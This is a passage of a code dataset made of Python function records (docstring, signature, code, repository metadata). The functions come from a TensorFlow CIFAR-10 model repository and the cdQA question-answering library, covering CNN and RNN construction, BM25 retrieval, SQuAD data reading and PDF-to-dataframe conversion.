\n# \u76ee\u6807\u51fd\u6570\nself.objective = tf.reduce_mean(\n    tf.nn.sparse_softmax_cross_entropy_with_logits(\n        logits=logits, labels=self.labels))\nself.avg_loss = self.objective\n\n# \u4f18\u5316\u5668\nlr = tf.cond(tf.less(self.global_step, 50000), \n             lambda: tf.constant(0.001),\n             lambda: tf.cond(tf.less(self.global_step, 100000), \n                             lambda: tf.constant(0.0001),\n                             lambda: tf.constant(0.00001)))\nself.optimizer = tf.train.AdamOptimizer(learning_rate=lr).minimize(\n    self.avg_loss, global_step=self.global_step)\n\n# \u89c2\u5bdf\u503c\ncorrect_prediction = tf.equal(self.labels, tf.argmax(logits, 1))\nself.accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))", "path": "src\\model\\resnet.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# input variable\n", "func_signal": "def construct_model(self, batch_size=128, n_channel=3, n_classes=10):\n", "code": "self.image = tf.placeholder(dtype=tf.float32, \n                            shape=[batch_size, 32, 32, n_channel], \n                            name='image')\nself.label = tf.placeholder(dtype=tf.float32, shape=[batch_size, n_classes], name='label')\nself.keep_prob = tf.placeholder(dtype=tf.float32, name='keep_prob')\n\n# convolutional layer 1\n# filter\nW_conv1 = tf.Variable(\n    initial_value=tf.random_normal(\n        shape=[5, 5, n_channel, 64],\n        mean=0.0, stddev=0.01), \n    name='W_conv1')\n# gamma\ngamma_conv1 = tf.Variable(\n    initial_value=tf.random_normal(\n        shape=[64]),\n    name='gamma_conv1')\n# bias\nb_conv1 = tf.Variable(\n    initial_value=tf.zeros(shape=[64]), \n    name='b_conv1')\n# hidden states\nconv_conv1 = tf.nn.conv2d(\n    input=self.image, filter=W_conv1,\n    strides=[1, 1, 1, 1], padding='SAME', \n    name='conv_conv1')\npool_conv1 = tf.nn.max_pool(\n    value=conv_conv1, ksize=[1, 2, 2, 1],\n    strides=[1, 2, 2, 1], padding='VALID', \n    name='pool_conv1')\n# batch normalization\nmean_conv1, variance_conv1 = tf.nn.moments(pool_conv1, axes=[0, 1, 2])\nnormal_pre = tf.reshape(pool_conv1, [batch_size*16*16, 64])\nself.nobn_conv1 = normal_pre\nmean_conv1 = tf.expand_dims(mean_conv1, dim=0)\nvariance_conv1 = tf.expand_dims(variance_conv1, dim=0)\nnormal_conv1 = (normal_pre - mean_conv1) / variance_conv1\nbn_conv1 = normal_conv1 * tf.expand_dims(gamma_conv1, axis=0) + b_conv1\nself.bn_conv1 = bn_conv1\nbn_conv1 = tf.reshape(bn_conv1, [batch_size, 16, 16, 64])\n# hidden_states\nh_conv1 = tf.nn.relu(bn_conv1, name='h_conv1')\n\n# convolutional layer 2\n# filter\nW_conv2 = tf.Variable(\n    initial_value=tf.random_normal(shape=[5, 5, 64, 128], \n                                   mean=0.0, stddev=0.01), \n    name='W_conv2')\n# gamma\ngamma_conv2 = tf.Variable(\n    initial_value=tf.random_normal(\n        shape=[128]),\n    name='gamma_conv2')\n# bias\nb_conv2 = tf.Variable(\n    initial_value=tf.zeros(shape=[128]), \n    name='b_conv2')\n# hidden states\nconv_conv2 = tf.nn.conv2d(\n    input=h_conv1, filter=W_conv2,\n    strides=[1, 1, 1, 1], padding='SAME', \n    name='conv_conv2')\npool_conv2 = tf.nn.max_pool(\n    value=conv_conv2, ksize=[1, 2, 2, 1],\n    strides=[1, 2, 2, 1], padding='VALID', \n    name='pool_conv2')\n# batch normalization\nmean_conv2, variance_conv2 = tf.nn.moments(pool_conv2, axes=[0, 1, 2])\nnormal_pre = tf.reshape(pool_conv2, [batch_size*8*8, 128])\nself.nobn_conv2 = normal_pre\nmean_conv2 = tf.expand_dims(mean_conv2, dim=0)\nvariance_conv2 = tf.expand_dims(variance_conv2, dim=0)\nnormal_conv2 = (normal_pre - mean_conv2) / variance_conv2\nbn_conv2 = normal_conv2 * tf.expand_dims(gamma_conv2, axis=0) + b_conv2\nself.bn_conv2 = bn_conv2\nbn_conv2 = tf.reshape(bn_conv2, [batch_size, 8, 8, 128])\n# hidden_states\nh_conv2 = tf.nn.relu(bn_conv2, name='h_conv2')\n\n# convolutional layer 3\n# filter\nW_conv3 = tf.Variable(\n    initial_value=tf.random_normal(shape=[5, 5, 128, 256], \n                                   mean=0.0, stddev=0.01), \n    name='W_conv2')\n# gamma\ngamma_conv3 = tf.Variable(\n    initial_value=tf.random_normal(\n        shape=[256]),\n    name='gamma_conv3')\n# bias\nb_conv3 = tf.Variable(\n    initial_value=tf.zeros(shape=[256]), \n    name='b_conv3')\n# hidden states\nconv_conv3 = tf.nn.conv2d(\n    input=h_conv2, filter=W_conv3,\n    strides=[1, 1, 1, 1], padding='SAME', \n    name='conv_conv3')\npool_conv3 = tf.nn.max_pool(\n    value=conv_conv3, ksize=[1, 2, 2, 1],\n    strides=[1, 2, 2, 1], padding='VALID', \n    name='pool_conv3')\n# batch normalization\nmean_conv3, variance_conv3 = tf.nn.moments(pool_conv3, axes=[0, 1, 2])\nnormal_pre = tf.reshape(pool_conv3, [batch_size*4*4, 256])\nself.nobn_conv3 = normal_pre\nmean_conv3 = tf.expand_dims(mean_conv3, dim=0)\nvariance_conv3 = tf.expand_dims(variance_conv3, dim=0)\nnormal_conv3 = (normal_pre - mean_conv3) / variance_conv3\nbn_conv3 = normal_conv3 * tf.expand_dims(gamma_conv3, axis=0) + b_conv3\nself.bn_conv3 = bn_conv3\nbn_conv3 = tf.reshape(bn_conv3, [batch_size, 4, 4, 256])\n# hidden_states\nh_conv3 = tf.nn.relu(bn_conv3, name='h_conv3')\nh_conv3_flat = tf.reshape(tensor=h_conv3, shape=[batch_size, 4*4*256], \n                          name='h_conv3_flat')\n\n# fully-connected layer\n# weight\nW_fc1 = tf.Variable(\n    initial_value=tf.random_normal(shape=[4*4*256, 1024], \n                                   mean=0.0, stddev=0.01), \n    name='W_fc1')\n# gamma\ngamma_fc1 = tf.Variable(\n    initial_value=tf.random_normal(\n        shape=[1024]),\n    name='gamma_fc1')\n# bias\nb_fc1 = tf.Variable(\n    initial_value=tf.zeros(shape=[1024]), \n    name='b_fc1')\n# hidden_states\ninput_fc1 = tf.matmul(h_conv3_flat, W_fc1)\nself.nobn_fc1 = input_fc1\n# batch normalization\nmean_fc1, variance_fc1 = tf.nn.moments(input_fc1, axes=[0])\nmean_fc1 = tf.expand_dims(mean_fc1, dim=0)\nvariance_fc1 = tf.expand_dims(variance_fc1, dim=0)\nnormal_fc1 = (input_fc1 - mean_fc1) / variance_fc1\nbn_fc1 = normal_fc1 * tf.expand_dims(gamma_fc1, axis=0) + b_fc1\nself.bn_fc1 = bn_fc1\n# hidden_states\nh_fc1 = tf.nn.relu(bn_fc1, name='h_conv3')\nh_fc1_dropout = tf.nn.dropout(h_fc1, keep_prob=self.keep_prob, name='h_fc1_dropout')\n\n# softmax layer\n# weight\nW_softmax = tf.Variable(\n    initial_value=tf.random_normal(shape=[1024, n_classes],\n                                   mean=0.0, stddev=0.1), \n    name='W_softmax')\n# gamma\ngamma_softmax = tf.Variable(\n    initial_value=tf.random_normal(\n        shape=[n_classes]),\n    name='gamma_softmax')\n# bias\nb_softmax = tf.Variable(\n    initial_value=tf.zeros(shape=[n_classes]), \n    name='b_softmax')\n# hidden_states\ninput_softmax = tf.matmul(h_fc1_dropout, W_softmax)\nself.nobn_softmax = input_softmax\n# batch normalization\nmean_softmax, variance_softmax = tf.nn.moments(input_softmax, axes=[0])\nmean_softmax = tf.expand_dims(mean_softmax, dim=0)\nvariance_softmax = tf.expand_dims(variance_softmax, dim=0)\nnormal_softmax = (input_softmax - mean_softmax) / variance_softmax\nbn_softmax = normal_softmax * tf.expand_dims(gamma_softmax, axis=0) + b_softmax\nself.bn_softmax = bn_softmax\n# softmax\nself.label_prob = tf.nn.softmax(logits=bn_softmax)\n\n# objective function and optimizer\nself.objective = - tf.reduce_sum(self.label * tf.log(self.label_prob + 1e-6))\nself.optimizer = tf.train.AdamOptimizer(learning_rate=0.001).minimize(self.objective)\n# observation\ncorrect_prediction = tf.equal(tf.argmax(self.label_prob, 1), tf.argmax(self.label, 1))\nself.accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))\nself.label_pred = tf.argmax(self.label_prob, 1)\nself.label_max_prob = tf.reduce_max(self.label_prob)\nself.gradient = tf.gradients(self.label_max_prob, self.image)", "path": "src\\trash\\basic_cnn_cifar.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# input variable\n", "func_signal": "def construct_model(self, batch_size):\n", "code": "self.flower = tf.placeholder(dtype=tf.float32, shape=[batch_size, 3], name='flower')\nself.label = tf.placeholder(dtype=tf.int32, shape=[batch_size], name='label')\nflower_series = tf.unstack(self.flower, num=3, axis=1, name='flower_series')\nlabel = tf.one_hot(self.label, depth=3, dtype=tf.float32, name='label')\n\n# recurrent layer\n# init state\ninit_state = tf.Variable(\n    initial_value=tf.zeros(shape=[batch_size, 16], dtype=tf.float32),\n    name='init_state')\n# filter\nW_rnn = tf.Variable(\n    initial_value=tf.random_normal(shape=[17, 16], mean=0.0, stddev=0.01), \n    name='W_rnn')\n# bias\nb_rnn = tf.Variable(\n    initial_value=tf.zeros(shape=[16]), \n    name='b_rnn')\n# hidden states\ncurrent_state = init_state\nstate_series = []\nfor current_input in flower_series:\n    current_input = tf.reshape(current_input, shape=[batch_size, 1])\n    concat_vector = tf.concat([current_input, current_state], axis=1)\n    next_state = tf.tanh(tf.matmul(concat_vector, W_rnn) + b_rnn)\n    self.next_state = next_state\n    state_series.append(next_state)\n    current_state = next_state\n\n# softmax layer\n# weight\nW_softmax = tf.Variable(\n    initial_value=tf.random_normal(shape=[16, 3], mean=0.0, stddev=0.01), \n    name='W_softmax')\n# bias\nb_softmax = tf.Variable(\n    initial_value=tf.zeros(shape=[3]), \n    name='b_softmax')\n# softmax\nlabel_pred = tf.nn.softmax(\n    logits=tf.matmul(state_series[-1], W_softmax) + b_softmax)\n\n# objective function and optimizer\nself.objective = - tf.reduce_sum(label * tf.log(label_pred))\nself.optimizer = tf.train.AdamOptimizer(learning_rate=0.01).minimize(self.objective)\n# observation\ncorrect_prediction = tf.equal(tf.argmax(label_pred, 1), tf.argmax(label, 1))\nself.accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))", "path": "src\\trash\\basic_rnn.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# hidden states\n", "func_signal": "def get_output(self, input, is_training=tf.constant(True)):\n", "code": "        self.hidden = self.dense(input)\n        \n        # batch normalization \u6280\u672f\n        if self.batch_normal:\n            self.hidden = self.bn(self.hidden, training=tf.constant(True))\n            \n        # dropout \u6280\u672f\n        if self.dropout:\n            self.hidden = tf.nn.dropout(self.hidden, keep_prob=self.keep_prob)\n        \n        # activation\n        if self.activation == 'relu':\n            self.output = tf.nn.relu(self.hidden)\n        elif self.activation == 'tanh':\n            self.output = tf.nn.tanh(self.hidden)\n        elif self.activation == 'softmax':\n            self.output = tf.nn.softmax(self.hidden)\n        elif self.activation == 'sigmoid':\n            self.output = tf.sigmoid(self.hidden)\n        elif self.activation == 'leaky_relu':\n            self.output = self.leaky_relu(self.hidden)\n        elif self.activation == 'none':\n            self.output = self.hidden\n    \n        # \u83b7\u53d6params\n        if self.batch_normal:\n            for tensor in self.dense.weights:\n                if 'kernel' in tensor.name:\n                    self.params['%s#%s' % (self.name, 'weight')] = tensor\n            for tensor in self.bn.weights:\n                if 'gamma' in tensor.name:\n                    self.params['%s#%s' % (self.name, 'gamma')] = tensor\n        else:\n            for tensor in self.dense.weights:\n                if 'kernel' in tensor.name:\n                    self.params['%s#%s' % (self.name, 'weight')] = tensor\n\n        return self.output", "path": "src\\tflayer\\dense_layer.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u56fe\u50cf\u767d\u5316\n", "func_signal": "def _image_whitening(self, images):\n", "code": "for i in range(images.shape[0]):\n    old_image = images[i,:,:,:]\n    new_image = (old_image - numpy.mean(old_image)) / numpy.std(old_image)\n    images[i,:,:,:] = new_image\n\nreturn images", "path": "src\\data\\cifar10.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "\"\"\" Send reader to CPU if device=='cpu' or to GPU if device=='cuda'\n\"\"\"\n", "func_signal": "def to(self, device):\n", "code": "if device not in (\"cpu\", \"cuda\"):\n    raise ValueError(\"Attribute device should be 'cpu' or 'cuda'.\")\n\nself.reader.model.to(device)\nself.reader.device = torch.device(device)\nreturn self", "path": "cdqa\\pipeline\\cdqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nParameters\n----------\nX : sparse matrix, [n_samples, n_features]\n    document-term query matrix\ncopy : boolean, optional (default=True)\nquery: boolean (default=False)\n    whether to transform a query or the documents database\n\nReturns\n-------\nvectors : sparse matrix, [n_samples, n_features]\n\n\"\"\"\n", "func_signal": "def transform(self, X=None, copy=True, is_query=False):\n", "code": "if is_query:\n    X = check_array(X, accept_sparse=\"csr\", dtype=FLOAT_DTYPES, copy=copy)\n    if not sp.issparse(X):\n        X = sp.csr_matrix(X, dtype=np.float64)\n\n    n_samples, n_features = X.shape\n\n    expected_n_features = self._doc_matrix.shape[1]\n    if n_features != expected_n_features:\n        raise ValueError(\n            \"Input has n_features=%d while the model\"\n            \" has been trained with n_features=%d\"\n            % (n_features, expected_n_features)\n        )\n\n    if self.use_idf:\n        check_is_fitted(self, \"_idf_diag\", \"idf vector is not fitted\")\n        X = sp.csr_matrix(X.toarray() * self._idf_diag.diagonal())\n\n    return X\n\nelse:\n    return self._doc_matrix", "path": "cdqa\\retriever\\text_transformers.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nVectorizes the input, whether it is a query or the list of documents\n\nParameters\n----------\nraw_corpus : iterable\n    an iterable which yields either str, unicode or file objects\n\nReturns\n-------\nvectors : sparse matrix, [n_queries, n_documents]\n    scores from BM25 statics for each document with respect to each query\n\"\"\"\n", "func_signal": "def transform(self, raw_corpus, is_query=False):\n", "code": "X = super().transform(raw_corpus) if is_query else None\n\nreturn self._bm25.transform(X, copy=False, is_query=is_query)", "path": "cdqa\\retriever\\vectorizers.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nLearn vocabulary and BM25 stats from training set.\n\nParameters\n----------\nraw_documents : iterable\n    an iterable which yields either str, unicode or file objects\n\nReturns\n-------\nself : BM25Vectorizer\n\"\"\"\n", "func_signal": "def fit(self, raw_documents, y=None):\n", "code": "X = super().fit_transform(raw_documents)\nself._bm25.fit(X)\nreturn self", "path": "cdqa\\retriever\\vectorizers.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nLearn vocabulary, idf and BM25 features. Return term-document matrix.\nThis is equivalent to fit followed by transform, but more efficiently\nimplemented.\n\nParameters\n----------\nraw_documents : iterable\n    an iterable which yields either str, unicode or file objects\n    \nReturns\n-------\nX : sparse matrix, [n_samples, n_features]\n    BM25 document-term matrix.\n\"\"\"\n", "func_signal": "def fit_transform(self, raw_documents, y=None):\n", "code": "X = super().fit_transform(raw_documents)\nself._bm25.fit(X)\nreturn self._bm25.transform(X, copy=False)", "path": "cdqa\\retriever\\vectorizers.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nFunction to convert PDFs to Dataframe with columns as title & paragraphs.\n\nParameters\n----------\n\nmin_length : integer\n    Minimum character length to be considered as a single paragraph\n\ninclude_line_breaks: bool\n    To concatenate paragraphs less than min_length to a single paragraph\n\n\n\nReturns\n-------------\ndf : Dataframe\n\n\nDescription\n-----------------\nIf include_line_breaks is set to True, paragraphs with character length\nless than min_length (minimum character length of a paragraph) will be\nconsidered as a line. Lines before or after each paragraph(length greater\nthan or equal to min_length) will be concatenated to a single paragraph to\nform the list of paragraphs in Dataframe.\n\nElse paragraphs are appended directly to form the list.\n\n\"\"\"\n", "func_signal": "def pdf_converter(directory_path, min_length=200, include_line_breaks=False):\n", "code": "list_file = os.listdir(directory_path)\nlist_pdf = []\nfor file in list_file:\n    if file.endswith(\"pdf\"):\n        list_pdf.append(file)\ndf = pd.DataFrame(columns=[\"title\", \"paragraphs\"])\nfor i, pdf in enumerate(list_pdf):\n    try:\n        df.loc[i] = [pdf.replace(\".pdf\",''), None]\n        raw = parser.from_file(os.path.join(directory_path, pdf))\n        s = raw[\"content\"].strip()\n        paragraphs = re.split(\"\\n\\n(?=\\u2028|[A-Z-0-9])\", s)\n        list_par = []\n        temp_para = \"\"  # variable that stores paragraphs with length<min_length\n        # (considered as a line)\n        for p in paragraphs:\n            if not p.isspace():  # checking if paragraph is not only spaces\n                if include_line_breaks:  # if True, check length of paragraph\n                    if len(p) >= min_length:\n                        if temp_para:\n                            # if True, append temp_para which holds concatenated\n                            # lines to form a paragraph before current paragraph p\n                            list_par.append(temp_para.strip())\n                            temp_para = (\n                                \"\"\n                            )  # reset temp_para for new lines to be concatenated\n                            list_par.append(\n                                p.replace(\"\\n\", \"\")\n                            )  # append current paragraph with length>min_length\n                        else:\n                            list_par.append(p.replace(\"\\n\", \"\"))\n                    else:\n                        # paragraph p (line) is concatenated to temp_para\n                        line = p.replace(\"\\n\", \" \").strip()\n                        temp_para = temp_para + f\" {line}\"\n                else:\n                    # appending paragraph p as is to list_par\n                    list_par.append(p.replace(\"\\n\", \"\"))\n            else:\n                if temp_para:\n                    list_par.append(temp_para.strip())\n\n        df.loc[i, \"paragraphs\"] = list_par\n    except:\n        print(\"Unexpected error:\", sys.exc_info()[0])\n        print(\"Unable to process file {}\".format(pdf))\nreturn df", "path": "cdqa\\utils\\converters.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\" Fit the QAPipeline retriever to a list of documents in a dataframe.\n\nParameters\n----------\ndata: dict str-path to json file\n     Annotated dataset in squad-like for Reader training\n\n\"\"\"\n\n", "func_signal": "def fit_reader(self, data=None):\n", "code": "train_examples, train_features = self.processor_train.fit_transform(data)\nself.reader.fit(X=(train_examples, train_features))\n\nreturn self", "path": "cdqa\\pipeline\\cdqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"Compute softmax probability over raw logits.\"\"\"\n", "func_signal": "def _compute_softmax(scores):\n", "code": "if not scores:\n    return []\n\nmax_score = None\nfor score in scores:\n    if max_score is None or score > max_score:\n        max_score = score\n\nexp_scores = []\ntotal_sum = 0.0\nfor score in scores:\n    x = math.exp(score - max_score)\n    exp_scores.append(x)\n    total_sum += x\n\nprobs = []\nfor score in exp_scores:\n    probs.append(score / total_sum)\nreturn probs", "path": "cdqa\\reader\\bertqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\n Converts a pandas dataframe with columns ['title', 'paragraphs'] to a json file with SQuAD format.\n\n Parameters\n----------\n df : pandas.DataFrame\n     a pandas dataframe with columns ['title', 'paragraphs']\n squad_version : str, optional\n     the SQuAD dataset version format (the default is 'v2.0')\n output_dir : str, optional\n     Enable export of output (the default is None)\n filename : str, optional\n     [description]\n\nReturns\n-------\njson_data: dict\n    A json object with SQuAD format\n\n Examples\n --------\n >>> from ast import literal_eval\n >>> import pandas as pd\n >>> from cdqa.utils.converters import df2squad\n >>> from cdqa.utils.filters import filter_paragraphs\n\n >>> df = pd.read_csv('../data/bnpp_newsroom_v1.1/bnpp_newsroom-v1.1.csv', converters={'paragraphs': literal_eval})\n >>> df['paragraphs'] = df['paragraphs'].apply(filter_paragraphs)\n\n >>> json_data = df2squad(df=df, squad_version='v1.1', output_dir='../data', filename='bnpp_newsroom-v1.1')\n\"\"\"\n\n", "func_signal": "def df2squad(df, squad_version=\"v1.1\", output_dir=None, filename=None):\n", "code": "json_data = {}\njson_data[\"version\"] = squad_version\njson_data[\"data\"] = []\n\nfor idx, row in tqdm(df.iterrows()):\n    temp = {\"title\": row[\"title\"], \"paragraphs\": []}\n    for paragraph in row[\"paragraphs\"]:\n        temp[\"paragraphs\"].append({\"context\": paragraph, \"qas\": []})\n    json_data[\"data\"].append(temp)\n\nif output_dir:\n    with open(os.path.join(output_dir, \"{}.json\".format(filename)), \"w\") as outfile:\n        json.dump(json_data, outfile)\n\nreturn json_data", "path": "cdqa\\utils\\converters.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"Read a SQuAD json file into a list of SquadExample.\"\"\"\n\n", "func_signal": "def read_squad_examples(input_file, is_training, version_2_with_negative):\n", "code": "if isinstance(input_file, str):\n    with open(input_file, \"r\", encoding=\"utf-8\") as reader:\n        input_data = json.load(reader)[\"data\"]\nelse:\n    input_data = input_file\n\nexamples = []\nfor entry in input_data:\n    for paragraph in entry[\"paragraphs\"]:\n        paragraph_text = paragraph[\"context\"]\n        doc_tokens = []\n        char_to_word_offset = []\n        prev_is_whitespace = True\n        for c in paragraph_text:\n            if _is_whitespace(c):\n                prev_is_whitespace = True\n            else:\n                if prev_is_whitespace:\n                    doc_tokens.append(c)\n                else:\n                    doc_tokens[-1] += c\n                prev_is_whitespace = False\n            char_to_word_offset.append(len(doc_tokens) - 1)\n\n        for qa in paragraph[\"qas\"]:\n            qas_id = qa[\"id\"]\n            question_text = qa[\"question\"]\n            try:\n                retriever_score = qa[\"retriever_score\"]\n            except KeyError:\n                retriever_score = 0\n            start_position = None\n            end_position = None\n            orig_answer_text = None\n            is_impossible = False\n            if is_training:\n                if version_2_with_negative:\n                    is_impossible = qa[\"is_impossible\"]\n                if (len(qa[\"answers\"]) != 1) and (not is_impossible):\n                    raise ValueError(\n                        \"For training, each question should have exactly 1 answer.\"\n                    )\n                if not is_impossible:\n                    answer = qa[\"answers\"][0]\n                    orig_answer_text = answer[\"text\"]\n                    answer_offset = answer[\"answer_start\"]\n                    answer_length = len(orig_answer_text)\n                    start_position = char_to_word_offset[answer_offset]\n                    end_position = char_to_word_offset[\n                        answer_offset + answer_length - 1\n                    ]\n                    # Only add answers where the text can be exactly recovered from the\n                    # document. If this CAN'T happen it's likely due to weird Unicode\n                    # stuff so we will just skip the example.\n                    #\n                    # Note that this means for training mode, every example is NOT\n                    # guaranteed to be preserved.\n                    actual_text = \" \".join(\n                        doc_tokens[start_position : (end_position + 1)]\n                    )\n                    cleaned_answer_text = \" \".join(\n                        whitespace_tokenize(orig_answer_text)\n                    )\n                    if actual_text.find(cleaned_answer_text) == -1:\n                        logger.warning(\n                            \"Could not find answer: '%s' vs. '%s'\",\n                            actual_text,\n                            cleaned_answer_text,\n                        )\n                        continue\n                else:\n                    start_position = -1\n                    end_position = -1\n                    orig_answer_text = \"\"\n\n            examples.append(\n                SquadExample(\n                    qas_id=qas_id,\n                    question_text=question_text,\n                    doc_tokens=doc_tokens,\n                    orig_answer_text=orig_answer_text,\n                    start_position=start_position,\n                    end_position=end_position,\n                    is_impossible=is_impossible,\n                    paragraph=paragraph_text,\n                    title=entry[\"title\"],\n                    retriever_score=retriever_score,\n                )\n            )\nreturn examples", "path": "cdqa\\reader\\bertqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\" Send reader to CPU\n\"\"\"\n", "func_signal": "def cpu(self):\n", "code": "self.reader.model.cpu()\nself.reader.device = torch.device(\"cpu\")\nreturn self", "path": "cdqa\\pipeline\\cdqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"Project the tokenized prediction back to the original text.\"\"\"\n\n# When we created the data, we kept track of the alignment between original\n# (whitespace tokenized) tokens and our WordPiece tokenized tokens. So\n# now `orig_text` contains the span of our original text corresponding to the\n# span that we predicted.\n#\n# However, `orig_text` may contain extra characters that we don't want in\n# our prediction.\n#\n# For example, let's say:\n#   pred_text = steve smith\n#   orig_text = Steve Smith's\n#\n# We don't want to return `orig_text` because it contains the extra \"'s\".\n#\n# We don't want to return `pred_text` because it's already been normalized\n# (the SQuAD eval script also does punctuation stripping/lower casing but\n# our tokenizer does additional normalization like stripping accent\n# characters).\n#\n# What we really want to return is \"Steve Smith\".\n#\n# Therefore, we have to apply a semi-complicated alignment heuristic between\n# `pred_text` and `orig_text` to get a character-to-character alignment. This\n# can fail in certain cases in which case we just return `orig_text`.\n\n", "func_signal": "def get_final_text(pred_text, orig_text, do_lower_case, verbose_logging=False):\n", "code": "def _strip_spaces(text):\n    ns_chars = []\n    ns_to_s_map = collections.OrderedDict()\n    for (i, c) in enumerate(text):\n        if c == \" \":\n            continue\n        ns_to_s_map[len(ns_chars)] = i\n        ns_chars.append(c)\n    ns_text = \"\".join(ns_chars)\n    return (ns_text, ns_to_s_map)\n\n# We first tokenize `orig_text`, strip whitespace from the result\n# and `pred_text`, and check if they are the same length. If they are\n# NOT the same length, the heuristic has failed. If they are the same\n# length, we assume the characters are one-to-one aligned.\ntokenizer = BasicTokenizer(do_lower_case=do_lower_case)\n\ntok_text = \" \".join(tokenizer.tokenize(orig_text))\n\nstart_position = tok_text.find(pred_text)\nif start_position == -1:\n    if verbose_logging:\n        logger.info(\"Unable to find text: '%s' in '%s'\" % (pred_text, orig_text))\n    return orig_text\nend_position = start_position + len(pred_text) - 1\n\n(orig_ns_text, orig_ns_to_s_map) = _strip_spaces(orig_text)\n(tok_ns_text, tok_ns_to_s_map) = _strip_spaces(tok_text)\n\nif len(orig_ns_text) != len(tok_ns_text):\n    if verbose_logging:\n        logger.info(\n            \"Length not equal after stripping spaces: '%s' vs '%s'\",\n            orig_ns_text,\n            tok_ns_text,\n        )\n    return orig_text\n\n# We then project the characters in `pred_text` back to `orig_text` using\n# the character-to-character alignment.\ntok_s_to_ns_map = {}\nfor (i, tok_index) in tok_ns_to_s_map.items():\n    tok_s_to_ns_map[tok_index] = i\n\norig_start_position = None\nif start_position in tok_s_to_ns_map:\n    ns_start_position = tok_s_to_ns_map[start_position]\n    if ns_start_position in orig_ns_to_s_map:\n        orig_start_position = orig_ns_to_s_map[ns_start_position]\n\nif orig_start_position is None:\n    if verbose_logging:\n        logger.info(\"Couldn't map start position\")\n    return orig_text\n\norig_end_position = None\nif end_position in tok_s_to_ns_map:\n    ns_end_position = tok_s_to_ns_map[end_position]\n    if ns_end_position in orig_ns_to_s_map:\n        orig_end_position = orig_ns_to_s_map[ns_end_position]\n\nif orig_end_position is None:\n    if verbose_logging:\n        logger.info(\"Couldn't map end position\")\n    return orig_text\n\noutput_text = orig_text[orig_start_position : (orig_end_position + 1)]\nreturn output_text", "path": "cdqa\\reader\\bertqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "# Snippet taken from: https://stackoverflow.com/a/48532692/11514226\n", "func_signal": "def _expand_paragraphs(df):\n", "code": "lst_col = \"paragraphs\"\ndf = pd.DataFrame(\n    {\n        col: np.repeat(df[col].values, df[lst_col].str.len())\n        for col in df.columns.drop(lst_col)\n    }\n).assign(**{lst_col: np.concatenate(df[lst_col].values)})[df.columns]\ndf[\"content\"] = df[\"paragraphs\"]\nreturn df.drop(\"paragraphs\", axis=1)", "path": "cdqa\\pipeline\\cdqa_sklearn.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
{"docstring": "\"\"\"\nParameters\n----------\nX : sparse matrix, [n_samples, n_features]\n    document-term matrix\n\"\"\"\n", "func_signal": "def fit(self, X):\n", "code": "X = check_array(X, accept_sparse=(\"csr\", \"csc\"))\nif not sp.issparse(X):\n    X = sp.csc_matrix(X)\nif self.use_idf:\n    n_samples, n_features = X.shape\n    df = _document_frequency(X)\n    idf = np.log((n_samples - df + 0.5) / (df + 0.5))\n    if self.floor is not None:\n        idf = idf * (idf > self.floor) + self.floor * (idf < self.floor)\n    self._idf_diag = sp.spdiags(idf, diags=0, m=n_features, n=n_features)\n\n# Create BM25 features\n\n# Document length (number of terms) in each row\n# Shape is (n_samples, 1)\ndl = X.sum(axis=1)\n# Number of non-zero elements in each row\n# Shape is (n_samples, )\nsz = X.indptr[1:] - X.indptr[0:-1]\n# In each row, repeat `dl` for `sz` times\n# Shape is (sum(sz), )\n# Example\n# -------\n# dl = [4, 5, 6]\n# sz = [1, 2, 3]\n# rep = [4, 5, 5, 6, 6, 6]\nrep = np.repeat(np.asarray(dl), sz)\n# Average document length\n# Scalar value\navgdl = np.average(dl)\n# Compute BM25 score only for non-zero elements\ndata = (\n    X.data\n    * (self.k1 + 1)\n    / (X.data + self.k1 * (1 - self.b + self.b * rep / avgdl))\n)\nX = sp.csr_matrix((data, X.indices, X.indptr), shape=X.shape)\n\nif self.norm:\n    X = normalize(X, norm=self.norm, copy=False)\n\nself._doc_matrix = X\nreturn self", "path": "cdqa\\retriever\\text_transformers.py", "repo_name": "cdqa-suite/cdQA", "stars": 598, "license": "apache-2.0", "language": "python", "size": 566}
